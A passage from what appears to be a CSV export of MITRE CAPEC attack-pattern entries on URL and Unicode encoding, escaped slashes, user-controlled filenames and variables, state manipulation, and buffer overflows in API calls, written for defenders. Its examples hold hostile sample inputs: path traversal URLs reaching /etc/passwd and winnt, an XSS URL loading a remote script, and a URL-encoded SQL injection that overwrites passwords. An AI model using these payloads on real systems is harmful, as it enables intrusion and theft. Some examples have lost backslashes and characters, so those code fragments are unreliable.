fairly obvious, so many Web servers and scripts prevent it. However, using alternate encoding tricks, an attacker may be able to get around badly implemented request filters. In October 2000, an adversary publicly revealed that Microsoft's IIS server suffered from a variation of this problem. In the case of IIS, all the attacker had to do was provide alternate encodings for the dots and/or slashes found in a classic attack. The Unicode translations are . yields C0 AE/ yields C0 AF yields C1 9C Using this conversion, the previously displayed URL can be encoded as http://target.server/some_directory/%C0AE/%C0AE/%C0AE%C0AE/%C0AE%C0AE/winntSee also: CVE-2000-0884::",::176::179::180::173::172::184::183::74::20::697::692::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Unicode Encoding::,N/A,https://capec.mitre.org/data/definitions/71.html
CAPEC-72,URL Encoding,Detailed,Draft,This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the Explore phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.TECHNIQUE:Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.:TECHNIQUE:Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject special characters into URL parameters] Using the information gathered in the Experiment phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.::",::The application should accepts and decodes URL input.::The application performs insufficient filtering/canonicalization on the URLs.::,::SKILL:An adversary can try special characters in the URL and bypass the URL validation.:LEVEL:Low::SKILL:The adversary may write a script to defeat the input filtering mechanism.:LEVEL:Medium::,N/A,"::If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::",::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::","::Attack Example: URL Encodings in IceCast MP3 Server. The following type of encoded string has been known traverse directories against the IceCast MP3 server9: http://[targethost]:8000/somefile/%2E%2E/target.mp3 or using /%25%25/ instead of /../. The control character .. can be used by an adversary to escape the document root.See also: CVE-2001-0784::Cross-Site Scripting URL-Encoded attack:http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTML execution:<script src=http://www.badplace.com/nasty.js></script> [REF-495]::SQL Injection Original database query in the example file - login.asp:SQLQuery = SELECT preferences FROM logintable WHERE userid=' & Request.QueryString(userid) & ' AND password=' & Request.QueryString(password) & '; URL-encoded attack:http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 Executed database query:SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d'; From URL encoded attacks, by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html::Attack Example: Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An adversary could provide a URL that included a string like /...%5C/ This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.See also: CVE-2001-1335::",::173::177::172::73::74::20::,N/A,N/A,https://capec.mitre.org/data/definitions/72.html
CAPEC-73,User-Controlled Filename,Standard,Draft,"An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:592::,N/A,::The victim must trust the name and locale of user controlled filenames.::,"::SKILL:To achieve a redirection and use of less trusted source, an attacker can simply edit data that the host uses to build the filename:LEVEL:Low::SKILL:Deploying a malicious look-a-like site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.:LEVEL:Medium::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Design: Use browser technologies that do not allow client side scripting.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Scan dynamically generated content against validation specification::,"::Phishing attacks rely on a user clicking on links on that are supplied to them by attackers masquerading as a trusted resource such as a bank or online auction site. The end user's email client hosts the supplied resource name in this case via email. The resource name, however may either 1) direct the client browser to a malicious site to steal credentials and/or 2) execute code on the client machine to probe the victim's host system and network environment.::",::20::184::96::348::116::350::86::697::,N/A,N/A,https://capec.mitre.org/data/definitions/73.html
CAPEC-74,Manipulating State,Meta,Stable,"The adversary modifies state information maintained by the target software or causes a state transition in hardware. If successful, the target will use this tainted state and execute in an unintended manner. State management is an important function within a software application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits. If there is a hardware logic error in a finite state machine, the adversary can use this to put the system in an undefined state which could cause a denial of service or exposure of secure data.",N/A,Medium,High,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:Adversary determines the nature of state management employed by the target. This includes determining the location (client-side, server-side or both applications) and possibly the items stored as part of user state.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary now tries to modify the user state contents (possibly indiscriminately if the contents are encrypted or otherwise obfuscated) or cause a state transition and observe the effects of this change on the target.::STEP:3:PHASE:Exploit:DESCRIPTION:Having determined how to manipulate the state, the adversary can perform illegitimate actions.::","::User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.::There is a faulty finite state machine in the hardware logic that can be exploited.::","::SKILL:The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way.:LEVEL:Medium::","::The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).::",N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.::Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.::Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.::All possible states must be handled by hardware finite state machines.::","::During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request. An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application.::",::372::315::353::693::1245::1253::1265::1271::,N/A,N/A,https://capec.mitre.org/data/definitions/74.html
CAPEC-75,Manipulating Writeable Configuration Files,Standard,Draft,"Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:176::,N/A,::Configuration files must be modifiable by the attacker::,"::SKILL:To identify vulnerable configuration files, and understand how to manipulate servers and erase forensic evidence:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Enforce principle of least privilege::Design: Backup copies of all configuration files::Implementation: Integrity monitoring for configuration files::Implementation: Enforce audit logging on code and configuration promotion procedures.::Implementation: Load configuration from separate process and memory space, for example a separate physical device like a CD::","::The BEA Weblogic server uses a config.xml file to store configuration data. If this file is not properly protected by the system access control, an attacker can write configuration information to redirect server output through system logs, database connections, malicious URLs and so on. Access to the Weblogic server may be from a so-called Custom realm which manages authentication and authorization privileges on behalf of user principals. Given write access, the attacker can insert a pointer to a custom realm jar file in the config.xml < CustomRealmConfigurationData=java.util.PropertiesName=CustomRealmRealmClassName=Maliciousrealm.jar/> The main issue with configuration files is that the attacker can leverage all the same functionality the server has, but for malicious means. Given the complexity of server configuration, these changes may be very hard for administrators to detect.::",::349::99::77::346::353::354::,N/A,N/A,https://capec.mitre.org/data/definitions/75.html
CAPEC-76,Manipulating Web Input to File System Calls,Detailed,Draft,"An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:126::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to create a valid file injection, the attacker needs to know what the underlying OS is so that the proper file seperator is used.TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated userTECHNIQUE:Spider web sites for all available links, entry points to the web site.:TECHNIQUE:Manually explore application and inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the applicationTECHNIQUE:Inject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests:TECHNIQUE:Inject context-appropriate malicious file system control syntax::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)TECHNIQUE:The attacker injects context-appropriate malicious file path to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.:TECHNIQUE:The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.::",::Program must allow for user controlled variables to be applied directly to the filesystem::,::SKILL:To identify file system entry point and execute against an over-privileged system interface:LEVEL:Low::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Design: Enforce principle of least privilege.::Design: Ensure all input is validated, and does not contain file system commands::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Design: For interactive user applications, consider if direct file system interface is necessary, instead consider having the application proxy communication.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::","::The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.::",::23::22::73::77::346::348::285::272::59::74::15::,N/A,N/A,https://capec.mitre.org/data/definitions/76.html
CAPEC-77,Manipulating User-Controlled Variables,Standard,Draft,"This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the adversary can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:22::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find user-controlled variables] Using the information found by probing the application, the adversary attempts to manipulate many user-controlled variables and observes the effects on the application. If the adversary notices any significant changes to the application, they will know that a certain variable is useful to the application.TECHNIQUE:Adversaries will try to alter many common variable names such as count, tempFile, i, etc. The hope is that they can alter the flow of the application without knowing the inner-workings.:TECHNIQUE:Adversaries will try to alter known environment variables.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate user-controlled variables] Once the adversary has found a user-controller variable(s) that is important to the application, they will manipulate it to change the normal behavior in a way that benefits the adversary.::",::A variable consumed by the application server is exposed to the client.::A variable consumed by the application server can be overwritten by the user.::The application server trusts user supplied data to compute business logic.::The application server does not perform proper input validation.::,::SKILL:The malicious user can easily try some well-known global variables and find one which matches.:LEVEL:Low::SKILL:The adversary can use automated tools to probe for variables that they can control.:LEVEL:Medium::,N/A,::A web penetration tool probing a web server may generate abnormal activities recorded on log files. Abnormal traffic such as a high number of request coming from the same client may also rise the warnings from a monitoring system or an intrusion detection tool.::,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Do not allow override of global variables and do Not Trust Global Variables. If the register_globals option is enabled, PHP will create global variables for each GET, POST, and cookie variable included in the HTTP request. This means that a malicious user may be able to set variables unexpectedly. For instance make sure that the server setting for PHP does not expose global variables.::A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary.::Separate the presentation layer and the business logic layer. Variables at the business logic layer should not be exposed at the presentation layer. This is to prevent computation of business logic from user controlled input data.::Use encapsulation when declaring your variables. This is to lower the exposure of your variables.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should be rejected by the program.::","::Attack Example: PHP Global Variables PHP is a study in bad security. The main idea pervading PHP is ease of use, and the mantra don't make the developer go to any extra work to get stuff done applies in all cases. This is accomplished in PHP by removing formalism from the language, allowing declaration of variables on first use, initializing everything with preset values, and taking every meaningful variable from a transaction and making it available. In cases of collision with something more technical, the simple almost always dominates in PHP. One consequence of all this is that PHP allows users of a Web application to override environment variables with user-supplied, untrusted query variables. Thus, critical values such as the CWD and the search path can be overwritten and directly controlled by a remote anonymous user. Another similar consequence is that variables can be directly controlled and assigned from the user-controlled values supplied in GET and POST request fields. So seemingly normal code like this, does bizarre things: while($count < 10){// Do something$count++;} Normally, this loop will execute its body ten times. The first iteration will be an undefined zero, and further trips though the loop will result in an increment of the variable $count. The problem is that the coder does not initialize the variable to zero before entering the loop. This is fine because PHP initializes the variable on declaration. The result is code that seems to function, regardless of badness. The problem is that a user of the Web application can supply a request such as GET /login.php?count=9 and cause $count to start out at the value 9, resulting in only one trip through the loop. Yerg. Depending on the configuration, PHP may accept user-supplied variables in place of environment variables. PHP initializes global variables for all process environment variables, such as $PATH and $HOSTNAME. These variables are of critical importance because they may be used in file or network operations. If an adversary can supply a new $PATH variable (such as PATH='/var'), the program may be exploitable. PHP may also take field tags supplied in GET/POST requests and transform them into global variables. This is the case with the $count variable we explored in our previous example. Consider another example of this problem in which a program defines a variable called $tempfile. An adversary can supply a new temp file such as $tempfile = /etc/passwd. Then the temp file may get erased later via a call to unlink($tempfile);. Now the passwd file has been erased--a bad thing indeed on most OSs. Also consider that the use of include() and require() first search $PATH, and that using calls to the shell may execute crucial programs such as ls. In this way, ls may be Trojaned (the adversary can modify $PATH to cause a Trojan copy of ls to be loaded). This type of attack could also apply to loadable libraries if $LD_LIBRARY_PATH is modified. Finally, some versions of PHP may pass user data to syslog as a format string, thus exposing the application to a format string buffer overflow.See also: File upload allows arbitrary file read by setting hidden form variables to match internal variable names (CVE-2000-0860)::",::15::94::96::285::302::473::1321::,N/A,N/A,https://capec.mitre.org/data/definitions/77.html
CAPEC-78,Using Escaped Slashes in Alternate Encoding,Detailed,Draft,"This attack targets the use of the backslash in alternate encoding. An adversary can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the adversary tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and attempts to escape multiple different special characters using a backslash.TECHNIQUE:Escape a special character with a backslash to bypass input validation.:TECHNIQUE:Try different encodings of both the backslash and the special character to see if this bypasses input validation::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate input] Once the adversary determines how to bypass filters that filter out special characters using an escaped slash, they will manipulate the user input in a way that is not intended by the application.::","::The application accepts the backlash character as escape character.::The application server does incomplete input data decoding, filtering and validation.::",::SKILL:The adversary can naively try backslash character and discover that the target host uses it as escape character.:LEVEL:Low::SKILL:The adversary may need deep understanding of the host target in order to exploit the vulnerability. The adversary may also use automated tools to probe for this vulnerability.:LEVEL:Medium::,N/A,::An adversary can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.::,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,"::Verify that the user-supplied data does not use backslash character to escape malicious characters.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::Be aware of the threat of alternative method of data encoding.::Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.::In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::","::For example, the byte pair 0 might result in a single zero byte (a NULL) being sent. Another example is t, which is sometimes converted into a tab character. There is often an equivalent encoding between the back slash and the escaped back slash. This means that / results in a single forward slash. A single forward slash also results in a single forward slash. The encoding looks like this: / yields // yields /::Attack Example: Escaped Slashes in Alternate Encodings An attack leveraging this pattern is very simple. If you believe the target may be filtering the slash, attempt to supply / and see what happens. Example command strings to try out include CWD ../../../../winnt which converts in many cases to CWD ../../../../winnt To probe for this kind of problem, a small C program that uses string output routines can be very useful. File system calls make excellent testing fodder. The simple snippet int main(int argc, char* argv[]){puts(/ ? . | );return 0; } produces the output / ? . | Clearly, the back slash is ignored, and thus we have hit on a number of alternative encodings to experiment with. Given our previous example, we can extend the attack to include other possibilities: CWD ..????/../../../winntCWD ../../../../winntCWD ..||||/../../../winnt::",::180::181::173::172::73::22::74::20::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/78.html
CAPEC-79,Using Slashes in Alternate Encoding,Detailed,Draft,"This attack targets the encoding of the Slash characters. An adversary would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the adversary many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and looks for areas where user input is used to access resources on the target host. The adversary attempts different encodings of slash characters to bypass input filters.TECHNIQUE:Try both backslash and forward slash characters:TECHNIQUE:Try different encodings for slash characters such as %5C::STEP:3:PHASE:Exploit:DESCRIPTION:[Traverse application directories] Once the adversary determines how to bypass filters that filter out slash characters, they will manipulate the user input to include slashes in order to traverse directories and access resources that are not intended for the user.::",::The application server accepts paths to locate resources.::The application server does insufficient input data validation on the resource path requested by the user.::The access right to resources are not set properly.::,::SKILL:An adversary can try variation of the slashes characters.:LEVEL:Low::SKILL:An adversary can use more sophisticated tool or script to scan a website and find a path filtering problem.:LEVEL:Medium::,N/A,"::If the first path decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.::Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.::An adversary can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity.::",::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process. Refer to the RFCs to safely decode URL.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)::Test your path decoding process against malicious input.::In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Assume all input is malicious. Create an allowlist that defines all valid input to the application based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::","::Attack Example: Slashes in Alternate Encodings The two following requests are equivalent on most Web servers: http://target server/some_directory......winnt is equivalent to http://target server/some_directory/../../../winnt Multiple encoding conversion problems can also be leveraged as various slashes are instantiated in URL-encoded, UTF-8, or Unicode. Consider the strings http://target server/some_directory..%5C..%5C..winnt where %5C is equivalent to the character.::",::173::180::181::20::74::73::22::185::200::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/79.html
CAPEC-8,Buffer Overflow in an API Call,Detailed,Draft,"This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An adversary who has knowledge of known vulnerable libraries or shared code can easily target software that makes use of these libraries. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary, with knowledge of vulnerable libraries or shared code modules, identifies a target application or program that makes use of these.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary attempts to use the API, and if they can they send a large amount of data to see if the buffer overflow attack really does work.TECHNIQUE:Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected based on their knowledge of the vulnerability and their desired outcome. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the API as the injection vector, the adversary injects the crafted overflow content into the buffer.::",::The target host exposes an API to the user.::One or more API functions exposed by the target host has a buffer overflow vulnerability.::,::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions, make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::",::Attack Example: Libc in FreeBSD A buffer overflow in the FreeBSD utility setlocale (found in the libc module) puts many programs at risk all at once.::Xtlib A buffer overflow in the Xt library of the X windowing system allows local users to execute commands with root privileges.::,::120::119::118::74::20::680::733::697::,N/A,N/A,https://capec.mitre.org/data/definitions/8.html
